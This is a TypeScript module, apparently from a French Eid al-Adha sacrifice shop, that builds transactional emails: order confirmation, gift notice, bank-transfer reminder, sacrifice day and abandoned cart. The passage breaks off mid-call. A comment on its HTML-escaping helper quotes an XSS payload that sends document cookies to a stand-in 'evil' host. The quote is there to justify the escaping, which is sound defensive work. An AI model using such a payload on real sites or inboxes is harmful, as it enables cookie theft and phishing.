import { Resend } from "resend";
import type { Order } from "@/types";
import {
  shareUrl,
  shareWhatsAppMessage,
  REFERRAL_DISCOUNT_EUR,
  REFERRER_REWARD_EUR,
} from "@/lib/referral";
import { unsubscribeHeaders, unsubscribeUrl } from "@/lib/unsubscribe";
import { createServiceRoleClient } from "@/lib/supabase/server";

/** Check si un email a été désinscrit. Cas marketing uniquement. */
async function isUnsubscribed(email: string): Promise<boolean> {
  try {
    const supabase = createServiceRoleClient();
    const { data } = await supabase
      .from("email_unsubscribes")
      .select("email")
      .eq("email", email.toLowerCase())
      .maybeSingle();
    return !!data;
  } catch (err) {
    // Fail-open : si la DB tombe, on n'envoie pas plutôt que de spammer
    console.error("isUnsubscribed check failed:", err);
    return true;
  }
}

let _resend: Resend | null = null;

function getResend(): Resend {
  if (!_resend) {
    _resend = new Resend(process.env.RESEND_API_KEY);
  }
  return _resend;
}

const FROM = "Qurbaniya <noreply@qurbaniya.fr>";
const SUPPORT_EMAIL = "support@qurbaniya.fr";
const WHATSAPP_NUMBER = "+33 7 44 79 88 83";
const WHATSAPP_LINK = "https://wa.me/33744798883";

/**
 * Échappe les caractères HTML dans un input client avant de l'injecter
 * dans les templates emails (HTML brut). Sans cette protection, un client
 * malicieux pourrait commander avec une niyyah contenant du HTML/JS
 * (ex: `<img src=x onerror=fetch("//evil/"+document.cookie)>`) qui serait
 * rendu dans la boîte du destinataire — vecteur phishing direct.
 *
 * Couvre `niyyah`, `prenom`, `nom`, `recipient_name`, `recipient_message`,
 * et toute autre saisie libre client.
 */
function esc(value: string | null | undefined): string {
  if (value === null || value === undefined) return "";
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/* ── Base template wrapper — fond crème, hero accueillant ── */
function emailLayout(content: string, recipientEmail?: string): string {
  const unsubLink = recipientEmail ? unsubscribeUrl(recipientEmail) : null;
  return `
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light">
<meta name="supported-color-schemes" content="light">
</head>
<body style="margin:0;padding:0;background:#F7F3ED;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;">
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;">
<tr><td align="center" style="padding:32px 16px;">
<table role="presentation" width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;background:#FEFCF8;border-radius:16px;box-shadow:0 4px 24px rgba(26,26,24,0.06);overflow:hidden;">

  <!-- Header vert foncé -->
  <tr><td style="background:#1B4332;padding:28px 24px;text-align:center;">
    <span style="font-family:Georgia,serif;font-size:26px;font-weight:bold;letter-spacing:0.5px;">
      <span style="color:#FEFCF8;">QURBANI</span><span style="color:#D4A843;">YA</span>
    </span>
    <p style="margin:6px 0 0;color:#D4A843;font-size:12px;letter-spacing:2px;text-transform:uppercase;font-family:Helvetica,Arial,sans-serif;">Sacrifice de l'Aïd al-Adha</p>
  </td></tr>

  <!-- Content -->
  <tr><td style="padding:40px 32px;font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:1.7;color:#1A1A18;">
    ${content}
  </td></tr>

  <!-- Footer crème -->
  <tr><td style="background:#EFE9DF;padding:28px 24px;text-align:center;font-family:Helvetica,Arial,sans-serif;font-size:13px;color:#5C5347;line-height:1.7;border-top:1px solid #E5DCC9;">
    <p style="margin:0 0 12px;font-weight:bold;color:#1A1A18;">Qurbaniya.fr</p>
    <p style="margin:0 0 12px;color:#5C5347;">Votre sacrifice conforme à la Sunnah</p>
    <p style="margin:0 0 16px;">
      <a href="mailto:${SUPPORT_EMAIL}" style="color:#1B4332;text-decoration:none;font-weight:bold;">${SUPPORT_EMAIL}</a>
      <span style="color:#8C8279;">&nbsp;·&nbsp;</span>
      <a href="${WHATSAPP_LINK}" style="color:#1B4332;text-decoration:none;font-weight:bold;">WhatsApp ${WHATSAPP_NUMBER}</a>
    </p>
    <p style="margin:0;font-size:11px;color:#8C8279;">
      Vous recevez cet email suite à votre commande sur qurbaniya.fr
    </p>
    ${unsubLink ? `<p style="margin:8px 0 0;font-size:11px;color:#8C8279;">
      <a href="${unsubLink}" style="color:#8C8279;text-decoration:underline;">Se désinscrire des emails promotionnels</a>
    </p>` : ""}
  </td></tr>

</table>
</td></tr>
</table>
</body>
</html>`;
}

/* ── Helper: bouton or principal ── */
function goldButton(text: string, href: string): string {
  return `
<table role="presentation" cellpadding="0" cellspacing="0" style="margin:32px auto;">
<tr><td align="center" style="background:#B8860B;border-radius:10px;box-shadow:0 4px 12px rgba(184,134,11,0.25);">
  <a href="${href}" target="_blank" style="display:inline-block;padding:16px 36px;font-family:Helvetica,Arial,sans-serif;font-size:15px;font-weight:bold;color:#FEFCF8;text-decoration:none;text-transform:uppercase;letter-spacing:1px;">
    ${text}
  </a>
</td></tr>
</table>`;
}

/* ── Helper: étape numérotée ── */
function stepItem(num: string, title: string, text: string): string {
  return `
<tr>
  <td style="padding:12px 14px 12px 0;vertical-align:top;width:40px;">
    <span style="display:inline-block;width:32px;height:32px;line-height:32px;text-align:center;border-radius:50%;background:#1B4332;color:#D4A843;font-weight:bold;font-size:14px;font-family:Helvetica,Arial,sans-serif;">${num}</span>
  </td>
  <td style="padding:12px 0;font-family:Helvetica,Arial,sans-serif;">
    <p style="margin:0 0 4px;color:#1A1A18;font-size:15px;font-weight:bold;">${title}</p>
    <p style="margin:0;color:#5C5347;font-size:14px;line-height:1.6;">${text}</p>
  </td>
</tr>`;
}

/* ── Helper: référence commande ── */
function orderRef(order: Order): string {
  return `QRB-2026-${order.id.slice(0, 4).toUpperCase()}`;
}

/* ── Helper: bloc parrainage (email confirmation) ── */
function referralEmailBlock(code: string, prenom: string): string {
  const url = shareUrl(code);
  const waLink = `https://wa.me/?text=${encodeURIComponent(shareWhatsAppMessage(code, prenom))}`;
  return `
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FDF6E3;border:1px solid #D4A843;border-radius:12px;margin:32px 0 28px;">
  <tr><td style="padding:24px;text-align:center;">
    <p style="margin:0 0 6px;color:#B8860B;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">🎁 Parrainez vos proches</p>
    <p style="margin:0 0 16px;color:#5C5347;font-size:14px;line-height:1.6;">
      Partagez votre code : vos filleuls bénéficient de <strong style="color:#1A1A18;">−${REFERRAL_DISCOUNT_EUR}€</strong> sans limite. Vous recevez <strong style="color:#1A1A18;">${REFERRER_REWARD_EUR}€</strong> d'avoir sur votre commande Aïd 2027 dès votre 1ᵉʳ filleul payé.
    </p>
    <p style="margin:0 0 4px;color:#8C8279;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Votre code</p>
    <p style="margin:0 0 18px;color:#B8860B;font-size:26px;font-weight:bold;font-family:monospace;letter-spacing:6px;">
      ${code}
    </p>
    <table role="presentation" cellpadding="0" cellspacing="0" style="margin:0 auto;">
      <tr><td style="background:#25D366;border-radius:8px;">
        <a href="${waLink}" target="_blank" style="display:inline-block;padding:12px 24px;font-family:Helvetica,Arial,sans-serif;font-size:13px;font-weight:bold;color:#FEFCF8;text-decoration:none;text-transform:uppercase;letter-spacing:0.5px;">
          📱 Partager sur WhatsApp
        </a>
      </td></tr>
    </table>
    <p style="margin:14px 0 0;color:#8C8279;font-size:12px;line-height:1.6;">
      Lien direct : <a href="${url}" style="color:#1B4332;font-weight:bold;text-decoration:none;">${url}</a>
    </p>
  </td></tr>
</table>`;
}

/* ═══════════════════════════════════════════
   EMAIL 1 — CONFIRMATION DE COMMANDE
   ═══════════════════════════════════════════ */
export async function sendOrderConfirmation(order: Order) {
  const ref = orderRef(order);
  const intentionLabel =
    order.intention === "pour_moi" ? "Pour vous-même" :
    order.intention === "famille" ? "Pour votre famille" : "En sadaqa";

  // ─── Calcul du montant réellement payé ───
  // order.amount = prix unitaire (140€). Pour les commandes multi-moutons
  // (quantity > 1), le total brut = amount × quantity. Le discount éventuel
  // s'applique sur la session entière.
  const qty = order.quantity ?? 1;
  const discount = order.discount_amount ?? 0;
  const grossAmount = order.amount * qty;
  const netAmount = grossAmount - discount;
  const fmt = (n: number) => `${n.toFixed(2).replace(".", ",")} €`;

  const html = emailLayout(`
    <!-- Hero coche verte -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 28px;">
      <tr><td align="center">
        <table role="presentation" cellpadding="0" cellspacing="0">
          <tr><td align="center" style="background:#E8F0EB;width:80px;height:80px;border-radius:50%;text-align:center;vertical-align:middle;">
            <span style="font-size:42px;line-height:80px;color:#2D6A4F;">&#10003;</span>
          </td></tr>
        </table>
      </td></tr>
    </table>

    <h1 style="color:#1A1A18;font-size:26px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
      Barakallah fikoum, ${esc(order.prenom)} !
    </h1>

    <p style="margin:0 0 32px;color:#5C5347;font-size:16px;text-align:center;line-height:1.6;">
      Votre sacrifice a bien été enregistré.<br>
      <em style="color:#B8860B;">Qu'Allah l'accepte de vous.</em>
    </p>

    <!-- Récap commande -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;border:1px solid #EFE9DF;border-radius:12px;margin:0 0 32px;">
      <tr><td style="padding:24px;">
        <p style="margin:0 0 16px;color:#8C8279;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Récapitulatif</p>
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Commande</td>
            <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;font-family:monospace;">${ref}</td>
          </tr>
          ${qty > 1 ? `
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Nombre de moutons</td>
            <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">${qty} × ${fmt(order.amount)}</td>
          </tr>
          ` : ""}
          ${discount > 0 ? `
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Sous-total</td>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;text-align:right;text-decoration:line-through;">${fmt(grossAmount)}</td>
          </tr>
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Réduction</td>
            <td style="color:#2D6A4F;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">−${fmt(discount)}</td>
          </tr>
          ` : ""}
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Montant payé</td>
            <td style="color:#1B4332;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">${fmt(netAmount)}</td>
          </tr>
          ${(() => {
            // Multi-sacrifices : afficher une ligne par sacrifice
            // (intention + niyyah). Pour 1 mouton, format classique.
            const sacrificesList =
              Array.isArray(order.sacrifices) && order.sacrifices.length > 0
                ? order.sacrifices
                : [{ niyyah: order.niyyah, intention: order.intention }];
            const intentionFr = (i: string) =>
              i === "pour_moi"
                ? "Pour vous-même"
                : i === "famille"
                ? "Pour votre famille"
                : "En sadaqa";
            if (sacrificesList.length === 1) {
              return `
                <tr>
                  <td style="color:#5C5347;font-size:14px;padding:6px 0;">Intention</td>
                  <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;">${intentionLabel}</td>
                </tr>
                <tr>
                  <td style="color:#5C5347;font-size:14px;padding:6px 0;">Niyyah</td>
                  <td style="color:#B8860B;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</td>
                </tr>
              `;
            }
            return sacrificesList
              .map(
                (s, i) => `
                  <tr>
                    <td style="color:#5C5347;font-size:14px;padding:6px 0;">${
                      i === 0 ? "1er" : `${i + 1}e`
                    } sacrifice</td>
                    <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;">
                      <span style="color:#5C5347;">${intentionFr(s.intention)} · </span>
                      <span style="color:#B8860B;font-family:Georgia,serif;font-style:italic;font-weight:bold;">${esc(s.niyyah)}</span>
                    </td>
                  </tr>
                `
              )
              .join("");
          })()}
          ${order.is_gift && order.recipient_name ? `<tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Offert à</td>
            <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">🎁 ${esc(order.recipient_name)}</td>
          </tr>` : ""}
        </table>
      </td></tr>
    </table>

    <!-- Cheikh -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FEFCF8;border:1px solid #EFE9DF;border-radius:12px;margin:0 0 32px;">
      <tr><td style="padding:20px;">
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
          <tr>
            <td style="vertical-align:middle;width:72px;padding-right:16px;">
              <img src="https://qurbaniya.fr/cheikhChamsouddin.jpg" alt="Cheikh Chamsouddin" width="64" height="64" style="display:block;width:64px;height:64px;border-radius:50%;object-fit:cover;border:2px solid #D4A843;">
            </td>
            <td style="vertical-align:middle;">
              <p style="margin:0 0 4px;color:#8C8279;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Votre sacrifice supervisé par</p>
              <p style="margin:0 0 2px;color:#1A1A18;font-size:16px;font-weight:bold;">Cheikh Chamsouddin</p>
              <p style="margin:0;color:#5C5347;font-size:13px;">Conformité Sunnah garantie</p>
            </td>
          </tr>
        </table>
      </td></tr>
    </table>

    <h2 style="color:#1A1A18;font-size:18px;margin:0 0 8px;font-weight:bold;font-family:Georgia,serif;">
      Ce qui se passe ensuite
    </h2>
    <p style="margin:0 0 20px;color:#5C5347;font-size:14px;">
      Vous n'avez plus rien à faire. Voici le déroulé :
    </p>

    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 28px;">
      ${stepItem("1", "Rappel à J-7", "Un email pour vous rappeler la date du sacrifice et confirmer votre numéro WhatsApp.")}
      ${stepItem("2", "Jour de l'Aïd", "Le sacrifice est effectué en votre nom par le cheikh, dans le respect total de la Sunnah.")}
      ${stepItem("3", "Vidéo nominative", "Vous recevez la preuve vidéo par WhatsApp dans les 24 heures qui suivent.")}
    </table>

    <!-- Encart WhatsApp important -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#E8F0EB;border-left:4px solid #2D6A4F;border-radius:0 8px 8px 0;margin:0 0 28px;">
      <tr><td style="padding:16px 20px;">
        <p style="margin:0 0 4px;color:#1B4332;font-size:14px;font-weight:bold;">
          📱 Vérifiez votre numéro WhatsApp
        </p>
        <p style="margin:0;color:#1B4332;font-size:13px;line-height:1.6;">
          La vidéo de votre sacrifice sera envoyée au numéro indiqué lors de la commande. Si vous avez un doute, écrivez-nous.
        </p>
      </td></tr>
    </table>

    ${goldButton("SUIVRE MON SACRIFICE", `https://qurbaniya.fr/ma-commande/${order.id}`)}

    <p style="margin:0 0 16px;color:#5C5347;font-size:13px;text-align:center;line-height:1.6;">
      Conservez ce lien : il permet de suivre l&apos;avancement de votre sacrifice (paiement, sourcing, jour de l&apos;Aïd, vidéo) à tout moment.
    </p>

    ${order.referral_code ? referralEmailBlock(order.referral_code, order.prenom) : ""}

    <p style="margin:0;color:#5C5347;font-size:14px;text-align:center;line-height:1.7;">
      Une question ? Écrivez à <a href="mailto:${SUPPORT_EMAIL}" style="color:#1B4332;text-decoration:none;font-weight:bold;">${SUPPORT_EMAIL}</a><br>
      ou contactez-nous sur <a href="${WHATSAPP_LINK}" style="color:#1B4332;text-decoration:none;font-weight:bold;">WhatsApp</a>.
    </p>
  `, order.email);

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
    subject: qty > 1
      ? `✅ Vos ${qty} sacrifices Aïd 2026 sont confirmés — Qurbaniya`
      : `✅ Votre sacrifice Aïd 2026 est confirmé — Qurbaniya`,
    html,
  });

  console.log("Email confirmation sent:", result.data?.id ?? "ok");

  // ─── Notification au destinataire si commande "cadeau" ───────────────
  // Le formulaire promet au client "votre destinataire sera prévenu" quand
  // is_gift + notify_recipient + recipient_email sont remplis. Avant ce
  // fix on ne faisait absolument rien → promesse non tenue. On envoie
  // maintenant un email léger au destinataire (sans facture, avec un mot
  // personnel si recipient_message est rempli).
  if (
    order.is_gift &&
    order.notify_recipient &&
    order.recipient_email &&
    order.recipient_email !== order.email
  ) {
    try {
      const recipName = order.recipient_name?.trim() || "Salam";
      const personalMessage = order.recipient_message?.trim() || "";
      const giftHtml = emailLayout(`
        <h1 style="color:#1A1A18;font-size:24px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
          Un cadeau pour vous, ${esc(recipName)}
        </h1>
        <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
          <strong>${esc(order.prenom)} ${esc(order.nom)}</strong> vous a offert un sacrifice
          de l'Aïd al-Adha 2026 via Qurbaniya — qu'Allah récompense cette générosité.
        </p>
        ${personalMessage ? `
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FDF6E3;border-left:4px solid #D4A843;border-radius:0 8px 8px 0;margin:0 0 24px;">
          <tr><td style="padding:16px 20px;">
            <p style="margin:0 0 6px;color:#8B6508;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Mot personnel</p>
            <p style="margin:0;color:#5C5347;font-size:14px;line-height:1.6;font-style:italic;font-family:Georgia,serif;">« ${esc(personalMessage)} »</p>
          </td></tr>
        </table>` : ""}
        <p style="margin:0 0 18px;color:#5C5347;font-size:14px;line-height:1.7;">
          Le sacrifice est programmé pour le <strong>mercredi 27 mai 2026</strong>,
          jour de l'Aïd. Vous recevrez la vidéo nominative directement sur cet
          email dans les 48 heures suivantes.
        </p>
        <p style="margin:0;color:#5C5347;font-size:13px;text-align:center;line-height:1.6;font-style:italic;font-family:Georgia,serif;">
          Qu'Allah accepte ce sacrifice de ${esc(order.prenom)}.
        </p>
      `, order.recipient_email);

      const giftResult = await getResend().emails.send({
        from: FROM,
        to: order.recipient_email,
        headers: unsubscribeHeaders(order.recipient_email),
        subject: `🎁 ${esc(order.prenom)} vous offre un sacrifice Aïd 2026`,
        html: giftHtml,
      });
      console.log("Email gift recipient sent:", giftResult.data?.id ?? "ok");
    } catch (giftErr) {
      // On ne casse pas le flux principal si le mail destinataire échoue
      console.error("Gift recipient email failed:", giftErr);
    }
  }

  return result;
}

/* ═══════════════════════════════════════════
   EMAIL 2 — VIREMENT EN ATTENTE
   ═══════════════════════════════════════════ */
export async function sendPaymentReminder(order: Order) {
  const ref = orderRef(order);

  const html = emailLayout(`
    <h1 style="color:#1A1A18;font-size:24px;margin:0 0 12px;font-weight:bold;font-family:Georgia,serif;">
      Finalisez votre commande, ${esc(order.prenom)}
    </h1>

    <p style="margin:0 0 28px;color:#5C5347;font-size:15px;line-height:1.7;">
      Votre commande <strong style="color:#1A1A18;font-family:monospace;">${ref}</strong> est en attente de paiement par virement bancaire.
      Votre place sera réservée dès réception du virement.
    </p>

    <!-- Coordonnées bancaires -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;border:1px solid #D4A843;border-radius:12px;margin:0 0 24px;">
      <tr><td style="padding:24px;">
        <p style="margin:0 0 16px;color:#B8860B;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Coordonnées bancaires</p>
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Bénéficiaire</td>
            <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">SAS Qurbaniya</td>
          </tr>
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">IBAN</td>
            <td style="color:#1A1A18;font-size:13px;padding:6px 0;text-align:right;font-weight:bold;font-family:monospace;">FR76 XXXX XXXX XXXX XXXX XXXX XXX</td>
          </tr>
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">BIC</td>
            <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;font-family:monospace;">XXXXXXXX</td>
          </tr>
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Montant</td>
            <td style="color:#1B4332;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">140,00 €</td>
          </tr>
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:6px 0;">Référence</td>
            <td style="color:#C0392B;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;font-family:monospace;">${ref}</td>
          </tr>
        </table>
      </td></tr>
    </table>

    <!-- Avertissement référence -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FBE9E5;border-left:4px solid #C0392B;border-radius:0 8px 8px 0;margin:0 0 28px;">
      <tr><td style="padding:16px 20px;">
        <p style="margin:0 0 4px;color:#C0392B;font-size:14px;font-weight:bold;">
          ⚠ Indiquez la référence dans le motif du virement
        </p>
        <p style="margin:0;color:#5C5347;font-size:13px;line-height:1.6;">
          Sans la référence <strong style="color:#1A1A18;font-family:monospace;">${ref}</strong>, nous ne pourrons pas associer le paiement à votre commande. Délai de traitement : 3 jours ouvrés après réception.
        </p>
      </td></tr>
    </table>

    <p style="margin:0;color:#5C5347;font-size:14px;text-align:center;line-height:1.7;">
      Un doute ? Écrivez à <a href="mailto:${SUPPORT_EMAIL}" style="color:#1B4332;text-decoration:none;font-weight:bold;">${SUPPORT_EMAIL}</a>
    </p>
  `, order.email);

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
    subject: `⏳ Finalisez votre commande Qurbaniya — Informations de virement`,
    html,
  });

  console.log("Email virement sent:", result.data?.id ?? "ok");
  return result;
}

/* ═══════════════════════════════════════════
   EMAIL 3 — JOUR DU SACRIFICE
   ═══════════════════════════════════════════ */
export async function sendSacrificeDay(order: Order) {
  const html = emailLayout(`
    <div style="text-align:center;margin:0 0 20px;">
      <span style="font-size:48px;">🌙</span>
    </div>

    <h1 style="color:#1A1A18;font-size:28px;margin:0 0 8px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
      Aïd Moubarak, ${esc(order.prenom)} !
    </h1>

    <p style="text-align:center;margin:0 0 28px;color:#B8860B;font-size:15px;font-style:italic;font-family:Georgia,serif;">
      Taqabbal Allahou minna wa minkoum
    </p>

    <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
      Votre sacrifice au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</strong> est actuellement effectué par notre cheikh, dans le respect total de la Sunnah.
    </p>

    <!-- Encart vidéo à venir -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#E8F0EB;border-left:4px solid #2D6A4F;border-radius:0 8px 8px 0;margin:0 0 28px;">
      <tr><td style="padding:18px 22px;">
        <p style="margin:0 0 6px;color:#1B4332;font-size:15px;font-weight:bold;">
          📹 Votre vidéo nominative arrive
        </p>
        <p style="margin:0;color:#1B4332;font-size:13px;line-height:1.6;">
          Vous la recevrez par <strong>WhatsApp</strong> dans les 24 heures, in sha Allah.
        </p>
      </td></tr>
    </table>

    <!-- Du'a -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;border:1px solid #EFE9DF;border-radius:12px;margin:0 0 28px;">
      <tr><td style="padding:24px;text-align:center;">
        <p style="margin:0 0 12px;color:#B8860B;font-size:11px;font-weight:bold;text-transform:uppercase;letter-spacing:1.5px;">Du'a pour vous</p>
        <p style="margin:0;color:#1A1A18;font-size:16px;font-style:italic;line-height:1.8;font-family:Georgia,serif;">
          « Qu'Allah accepte votre sacrifice, vous accorde Sa miséricorde<br>
          et vous réunisse avec vos proches au Paradis. »
        </p>
      </td></tr>
    </table>

    <p style="margin:0;color:#5C5347;font-size:14px;text-align:center;font-family:Georgia,serif;font-style:italic;">
      Aïd Moubarak de toute l'équipe Qurbaniya
    </p>
  `, order.email);

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
    subject: `🌙 Votre sacrifice est en cours — Aïd Moubarak !`,
    html,
  });

  console.log("Email sacrifice day sent:", result.data?.id ?? "ok");
  return result;
}

/* ═══════════════════════════════════════════
   EMAIL 5 — RELANCE PANIER ABANDONNÉ
   ═══════════════════════════════════════════ */
export async function sendAbandonedCartReminder(order: Order, resumeUrl: string) {
  if (await isUnsubscribed(order.email)) {
    console.log("Skip abandoned cart — unsubscribed:", order.email);
    return null;
  }

  // ─── Multi-mouton + discount handling (aligné sur sendOrderConfirmation) ──
  // Même logique : amount = prix unitaire (140), total = amount × qty,
  // discount_amount déduit du total. Et si sacrifices[] est rempli, on liste
  // chaque sacrifice (intention + niyyah) au lieu d'une seule ligne.
  const qty = order.quantity ?? 1;
  const discount = order.discount_amount ?? 0;
  const grossAmount = order.amount * qty;
  const netAmount = grossAmount - discount;
  const fmt = (n: number) => `${n.toFixed(2).replace(".", ",")} €`;

  const sacrificesList =
    Array.isArray(order.sacrifices) && order.sacrifices.length > 0
      ? order.sacrifices
      : [{ niyyah: order.niyyah, intention: order.intention }];

  const intentionFr = (i: string) =>
    i === "pour_moi"
      ? "Pour vous-même"
      : i === "famille"
      ? "Pour votre famille"
      : "En sadaqa";

  // Phrase d'accroche : adapte au pluriel et liste les niyyahs si multi
  const introSentence =
    sacrificesList.length === 1
      ? (() => {
          const introIntention =
            order.intention === "pour_moi"
              ? "pour vous-même"
              : order.intention === "famille"
              ? "pour votre famille"
              : "en sadaqa";
          return `Votre commande pour un sacrifice ${introIntention} au nom de
            <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</strong>
            est en attente de paiement.`;
        })()
      : `Votre commande pour <strong>${qty} sacrifices</strong> est en attente de paiement.`;

  const html = emailLayout(`
    <h1 style="color:#1A1A18;font-size:25px;margin:0 0 12px;font-weight:bold;font-family:Georgia,serif;">
      Vous y étiez presque, ${esc(order.prenom)}
    </h1>

    <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;">
      ${introSentence}
      Aïd 2026 approche (le 27 mai) et les places se remplissent vite.
    </p>

    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;border:1px solid #EFE9DF;border-radius:12px;margin:0 0 28px;">
      <tr><td style="padding:20px 24px;">
        <p style="margin:0 0 12px;color:#8C8279;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Récap de votre commande</p>
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:5px 0;">${qty > 1 ? `${qty} sacrifices mouton` : "Sacrifice mouton"} — Aïd 2026</td>
            <td style="color:#1A1A18;font-size:14px;padding:5px 0;text-align:right;font-weight:bold;">${qty > 1 ? `${qty} × ${fmt(order.amount)}` : fmt(order.amount)}</td>
          </tr>
          ${discount > 0 ? `
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:5px 0;">Sous-total</td>
            <td style="color:#5C5347;font-size:14px;padding:5px 0;text-align:right;text-decoration:line-through;">${fmt(grossAmount)}</td>
          </tr>
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:5px 0;">Réduction</td>
            <td style="color:#2D6A4F;font-size:14px;padding:5px 0;text-align:right;font-weight:bold;">−${fmt(discount)}</td>
          </tr>
          ` : ""}
          <tr>
            <td style="color:#5C5347;font-size:14px;padding:5px 0;font-weight:bold;">Total à payer</td>
            <td style="color:#1B4332;font-size:14px;padding:5px 0;text-align:right;font-weight:bold;">${fmt(netAmount)}</td>
          </tr>
          ${sacrificesList.length === 1
            ? `<tr>
                <td style="color:#5C5347;font-size:14px;padding:5px 0;">Niyyah</td>
                <td style="color:#B8860B;font-size:14px;padding:5px 0;text-align:right;font-weight:bold;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</td>
              </tr>`
            : sacrificesList
                .map(
                  (s, i) => `
                    <tr>
                      <td style="color:#5C5347;font-size:14px;padding:5px 0;">${
                        i === 0 ? "1er" : `${i + 1}e`
                      } sacrifice</td>
                      <td style="color:#1A1A18;font-size:14px;padding:5px 0;text-align:right;">
                        <span style="color:#5C5347;">${intentionFr(s.intention)} · </span>
                        <span style="color:#B8860B;font-family:Georgia,serif;font-style:italic;font-weight:bold;">${esc(s.niyyah)}</span>
                      </td>
                    </tr>
                  `
                )
                .join("")}
        </table>
      </td></tr>
    </table>

    ${goldButton("FINALISER MA COMMANDE", resumeUrl)}

    <p style="margin:0 0 24px;color:#5C5347;font-size:13px;text-align:center;line-height:1.6;">
      Ce lien reste valable 24 h après la création de votre commande.<br>
      Au-delà, il vous faudra recommencer le tunnel de réservation.
    </p>

    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FDF6E3;border-left:4px solid #D4A843;border-radius:0 8px 8px 0;margin:0 0 24px;">
      <tr><td style="padding:14px 18px;">
        <p style="margin:0;color:#8B6508;font-size:13px;line-height:1.6;">
          <strong>Une question, un doute ?</strong> Répondez à cet email ou écrivez-nous sur
          <a href="${WHATSAPP_LINK}" style="color:#1B4332;text-decoration:none;font-weight:bold;">WhatsApp</a>.
          On vous répond dans la journée.
        </p>
      </td></tr>
    </table>

    <p style="margin:0;color:#5C5347;font-size:13px;text-align:center;line-height:1.7;font-style:italic;font-family:Georgia,serif;">
      Qu'Allah vous facilite — toute l'équipe Qurbaniya.
    </p>
  `, order.email);

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
